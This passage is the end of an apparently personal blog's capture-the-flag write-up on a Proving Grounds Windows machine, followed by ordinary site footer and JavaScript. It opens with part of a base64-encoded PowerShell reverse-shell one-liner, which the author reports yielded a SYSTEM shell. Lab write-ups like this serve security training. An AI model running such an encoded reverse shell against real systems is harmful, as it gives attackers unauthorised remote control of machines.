+IAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBu
+AGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== -UseBas
+icParsing | Select-Object -Expand RawContent
+</code></pre><p>Shortly after I received a <em>SYSTEM</em> reverse shell and was able to read <em>C:\users\administrator\desktop\proof.txt</em>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/proving-grounds-practice/">Proving Grounds Practice</a></li>
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/writeups/pg_internal/">
+    <span class="title">Next »</span>
+    <span>PG Practice - Internal</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
